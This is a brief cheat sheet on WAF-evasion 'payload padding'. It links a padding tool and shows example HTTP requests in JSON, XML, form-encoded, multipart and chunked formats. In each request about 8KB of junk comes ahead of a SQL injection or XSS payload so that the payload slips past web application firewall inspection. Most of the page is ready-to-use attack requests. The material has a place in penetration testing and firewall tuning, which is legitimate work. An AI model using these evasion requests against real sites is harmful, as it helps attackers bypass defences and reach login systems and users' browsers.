# Payload Types

## Payload Padding

Tool for padding attacks:

https://github.com/assetnote/nowafpls

### 1) JSON

8KB are harmless "A" chars.

    {
      "junk_padding": "A".repeat(8192),
      "username": "admin' OR 1=1--",
      "password": "password123"
    }

### 2) XML (SOAP and XML parsers)

    <!-- A very large benign XML comment repeated until the desired size -->
    <user>
      <username>admin' OR 1=1--</username>
    </user>

### 3) From-encoded parsing (Classic Web Forms)

    POST /login HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    
    padding_data=[8KB_of_junk]&username=<script>alert(1)</script>

### 4) Multipart boundary padding (File Uploads)

    POST /upload HTTP/1.1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
    
    ------WebKitFormBoundary
    Content-Disposition: form-data; name="junk_file"; filename="junk.txt"
    Content-Type: text/plain
    
    [... 8KB to 128KB of 'A's ...]
    ------WebKitFormBoundary
    Content-Disposition: form-data; name="payload"
    
    <script>alert(1)</script>
    ------WebKitFormBoundary--

### 5) Chunked Transfer Encoding

    POST /api/submit HTTP/1.1
    Transfer-Encoding: chunked
    Content-Type: application/json
    
    2000
    {"junk_padding": "[8192 bytes of 'A's]", "next": "
    40
    ", "payload": "admin' OR 1=1--"}
    0

### 6) HTTP Desync and Parser Confusion

Use unexpected character encoding like

    UTF-16
    UTF-8
    etc

